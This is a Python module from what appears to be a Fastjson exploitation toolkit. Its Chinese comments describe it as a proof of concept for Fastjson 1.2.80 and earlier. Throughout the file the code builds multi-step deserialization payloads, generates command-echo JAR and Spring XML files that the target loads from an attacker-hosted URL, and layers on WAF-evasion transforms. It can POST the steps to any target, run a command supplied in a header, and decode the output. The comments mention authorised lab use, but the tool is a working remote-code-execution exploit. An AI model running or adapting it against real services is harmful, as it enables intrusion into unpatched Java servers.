"""Fastjson ≤1.2.80 证明 PoC：生成多步 payload，可选顺序 POST。"""

from __future__ import annotations

import base64
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, urlunparse

import httpx

from fastjson_toolkit.poc.echo import (
    build_echo_artifact,
    build_groovy_echo_jar,
    build_spring_echo_xml,
    normalize_engine,
    supports_1280_echo,
)
from fastjson_toolkit.poc.getter import wrap_with_currency
from fastjson_toolkit.poc.v1_2_80.catalog import get_gadget, list_gadgets
from fastjson_toolkit.poc.v1_2_80.models import (
    Poc1280GenerateOptions,
    Poc1280GenerateResult,
    Poc1280SendOptions,
    Poc1280SendResult,
)
from fastjson_toolkit.poc.v1_2_80.payloads import DEFAULT_ATTACK_BASE, build_steps
from fastjson_toolkit.waf import apply_waf_payloads

COMMON_NOTES = [
    "RCE 证明：默认写文件（/tmp/fj1280_<gadget>）；开启 echo 时改为命令回显。",
    "原理：双 @type 以 java.lang.Exception 作 expectClass，"
    "ThrowableDeserializer.cast → ParserConfig.getDeserializer 缓存字段类型后恢复利用类。",
    "1.2.83 起对 Throwable 子类从 mapping 取出后清空，本链失效。",
    "多步链必须同进程共享 ParserConfig；靶场 http://127.0.0.1:18280/api/fastjson ；"
    "攻击资源（容器内自拉取）http://127.0.0.1:18080/attack/。",
    "payload 含重复 @type，勿再 json.dumps。仅授权测试 / 本地靶场。",
    "getter：$ref 已内嵌；业务点另有期望类时可开 wrap_currency 套 Currency"
    "（MiscCodec，与版本无关；多步链逐步套层）。",
]

_LAB_ATTACK = (
    Path(__file__).resolve().parents[4] / "lab" / "fastjson-1280-lab" / "attack"
)


def _decode_echo_output(headers: dict[str, str], body: str) -> Optional[str]:
    lower = {str(k).lower(): v for k, v in headers.items()}
    b64 = lower.get("x-echo")
    if b64:
        try:
            return base64.b64decode(b64).decode("utf-8", errors="replace")
        except Exception:  # noqa: BLE001
            pass
    text = (body or "").strip()
    if text and (lower.get("x-echo-cmd") or lower.get("x-echo-engine")):
        if "Internal Server Error" not in text:
            return text
    return None


def _prepare_echo_assets(
    gadget: str,
    *,
    engine: str,
    cmd_header: str,
    cmd: str,
    attack_base: str,
) -> tuple[str | None, str | None, Optional[str], Optional[str], list[str]]:
    """返回 (socket_factory_arg, classpath, jar_b64, xml_b64, notes)。"""
    base = attack_base.rstrip("/")
    notes: list[str] = []
    jar_b64: Optional[str] = None
    xml_b64: Optional[str] = None

    if gadget == "groovy":
        jar_bytes, art = build_groovy_echo_jar(
            engine=engine, cmd_header=cmd_header, default_cmd=cmd
        )
        jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
        out = _LAB_ATTACK / "evil-echo.jar"
        try:
            _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
            out.write_bytes(jar_bytes)
            notes.append(f"已写入本地 {out}（若 HTTP 攻击站挂载该目录可直接用）")
        except OSError:
            notes.append("无法写入 lab attack 目录；请自行托管 evil-echo.jar（见 attack_jar_b64）")
        classpath = f"{base}/evil-echo.jar"
        notes.append(
            f"Groovy 回显 jar：engine={engine}，Header {cmd_header}={cmd}；"
            f"classpathList → {classpath}"
        )
        return None, classpath, jar_b64, None, notes

    # postgresql / jython：echo.jar + bean-echo.xml
    art = build_echo_artifact(
        engine=engine,
        cmd_header=cmd_header,
        default_cmd=cmd,
        class_name="EchoPayload",
        banner="FJ1280-ECHO",
    )
    jar_bytes = art.as_jar()
    jar_url = f"{base}/echo.jar"
    xml_bytes = build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
    jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
    xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
    try:
        _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
        (_LAB_ATTACK / "echo.jar").write_bytes(jar_bytes)
        (_LAB_ATTACK / "bean-echo.xml").write_bytes(xml_bytes)
        notes.append(f"已写入 {_LAB_ATTACK / 'echo.jar'} 与 bean-echo.xml")
    except OSError:
        notes.append("无法写入 lab attack 目录；请托管 echo.jar + bean-echo.xml（见 result b64）")
    xml_url = f"{base}/bean-echo.xml"
    notes.append(
        f"Spring XML 回显：engine={engine}，Header {cmd_header}={cmd}；"
        f"socketFactoryArg → {xml_url}（XML 内拉 {jar_url}）"
    )
    return xml_url, None, jar_b64, xml_b64, notes


def generate_poc_1280(
    options: Optional[Poc1280GenerateOptions] = None,
) -> Poc1280GenerateResult:
    opts = options or Poc1280GenerateOptions()
    entry = get_gadget(opts.gadget)

    socket_arg = opts.socket_factory_arg
    classpath = opts.classpath
    echo_on = bool(opts.echo)
    engine = ""
    cmd_header = ""
    jar_b64: Optional[str] = None
    xml_b64: Optional[str] = None
    extra_notes: list[str] = []

    if echo_on:
        if not supports_1280_echo(entry.id):
            raise ValueError(
                f"gadget={entry.id} 不支持命令回显；"
                "请选用 postgresql / jython / groovy（写文件链无 defineClass/exec 入口）"
            )
        engine = normalize_engine(opts.engine)
        cmd_header = (opts.cmd_header or "X-Cmd").strip() or "X-Cmd"
        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
        socket_arg, classpath, jar_b64, xml_b64, extra_notes = _prepare_echo_assets(
            entry.id,
            engine=engine,
            cmd_header=cmd_header,
            cmd=opts.cmd or "id",
            attack_base=attack_base,
        )

    steps_raw = build_steps(
        entry.id,
        file=opts.file,
        content=opts.content,
        url=opts.url,
        guess_byte=opts.guess_byte,
        host=opts.host,
        port=opts.port,
        user=opts.user,
        socket_factory_arg=socket_arg,
        classpath=classpath,
    )
    if opts.wrap_currency:
        steps_raw = [
            wrap_with_currency(s, currency_field=opts.currency_field)
            for s in steps_raw
        ]
    steps, waf_techs, waf_notes = apply_waf_payloads(
        steps_raw, opts.waf_techniques, opts.waf_options
    )
    notes = list(COMMON_NOTES)
    notes.append(entry.description)
    notes.extend(extra_notes)
    if entry.steps > 1:
        notes.append(f"本 gadget 共 {len(steps)} 步，请按 steps 顺序发送。")
    if not echo_on:
        notes.append(f"写文件证明：{entry.marker_file} ← {entry.marker_content!r}")
    if opts.wrap_currency:
        notes.append(
            f"已对每步套 java.util.Currency（字段 {opts.currency_field}）以触发 getter。"
        )
    notes.extend(waf_notes)
    return Poc1280GenerateResult(
        ok=True,
        gadget=entry.id,
        title=entry.title,
        payload=steps[-1] if steps else "",
        payload_raw=steps_raw[-1] if waf_techs and steps_raw else None,
        steps=steps,
        steps_raw=steps_raw if waf_techs else [],
        wrap_currency=opts.wrap_currency,
        waf_techniques=waf_techs,
        notes=notes,
        requires=list(entry.requires),
        jdk=entry.jdk,
        echo=echo_on,
        engine=engine,
        cmd_header=cmd_header,
        attack_jar_b64=jar_b64,
        attack_xml_b64=xml_b64,
    )


def _reset_url(target: str) -> str:
    parsed = urlparse(target)
    path = parsed.path.rstrip("/")
    if path.endswith("/fastjson"):
        path = path[: -len("/fastjson")] + "/reset"
    elif path.endswith("/json"):
        path = path[: -len("/json")] + "/api/reset"
    else:
        path = path + "/../reset"
    return urlunparse(parsed._replace(path=path))


def run_poc_1280(
    options: Optional[Poc1280SendOptions] = None,
) -> Poc1280SendResult:
    opts = options or Poc1280SendOptions()
    gen = generate_poc_1280(opts)
    summary = f"已生成 {gen.title}（{len(gen.steps)} 步，未发送）"
    if gen.waf_techniques:
        summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
    if gen.echo:
        summary += f"；echo={gen.engine} header={gen.cmd_header}"
    result = Poc1280SendResult(
        ok=True,
        gadget=gen.gadget,
        title=gen.title,
        payload=gen.payload,
        payload_raw=gen.payload_raw,
        steps=gen.steps,
        steps_raw=gen.steps_raw,
        wrap_currency=gen.wrap_currency,
        waf_techniques=gen.waf_techniques,
        sent=False,
        summary=summary,
        notes=gen.notes,
        requires=gen.requires,
        jdk=gen.jdk,
        echo=gen.echo,
        engine=gen.engine,
        cmd_header=gen.cmd_header,
        attack_jar_b64=gen.attack_jar_b64,
        attack_xml_b64=gen.attack_xml_b64,
    )
    if not opts.send:
        return result

    target = opts.target.strip()
    if not target:
        result.ok = False
        result.summary = "target 不能为空"
        return result

    headers = {"Content-Type": opts.content_type, **(opts.headers or {})}
    if gen.echo and gen.cmd_header:
        headers.setdefault(gen.cmd_header, opts.cmd or "id")
    status_codes: list[int] = []
    previews: list[str] = []
    last_headers: dict[str, str] = {}
    last_body = ""
    try:
        with httpx.Client(
            timeout=opts.timeout,
            proxy=opts.proxy,
            verify=not opts.insecure,
            follow_redirects=True,
            trust_env=False,
        ) as client:
            if opts.reset_cache:
                try:
                    client.post(_reset_url(target), headers=headers)
                except Exception:  # noqa: BLE001
                    pass
            for step in gen.steps:
                resp = client.post(
                    target, content=step.encode("utf-8"), headers=headers
                )
                status_codes.append(resp.status_code)
                previews.append((resp.text or "")[:2000])
                last_headers = {str(k): str(v) for k, v in resp.headers.items()}
                last_body = resp.text or ""
    except Exception as exc:  # noqa: BLE001
        result.ok = False
        result.sent = True
        result.status_codes = status_codes
        result.response_previews = previews
        result.status_code = status_codes[-1] if status_codes else None
        result.response_preview = previews[-1] if previews else ""
        result.summary = f"发送失败: {exc}"
        result.raw = {"error": str(exc), "status_codes": status_codes}
        return result

    echo_out = _decode_echo_output(last_headers, last_body) if gen.echo else None
    result.sent = True
    result.status_codes = status_codes
    result.response_previews = previews
    result.status_code = status_codes[-1] if status_codes else None
    result.response_preview = previews[-1] if previews else ""
    result.echo_output = echo_out
    result.raw = {"status_codes": status_codes, "headers": last_headers}
    result.ok = True
    codes = ",".join(str(c) for c in status_codes)
    if echo_out:
        result.summary = (
            f"已按序 POST {gen.title} ×{len(status_codes)} 步 → HTTP [{codes}]；回显成功"
        )
    else:
        result.summary = (
            f"已按序 POST {gen.title} ×{len(status_codes)} 步 → HTTP [{codes}]"
            + ("（请确认攻击资源已托管且 Header 正确）" if gen.echo else "（请用 GET /api/markers 确认写文件 RCE）")
        )
    return result


__all__ = [
    "COMMON_NOTES",
    "generate_poc_1280",
    "list_gadgets",
    "run_poc_1280",
]
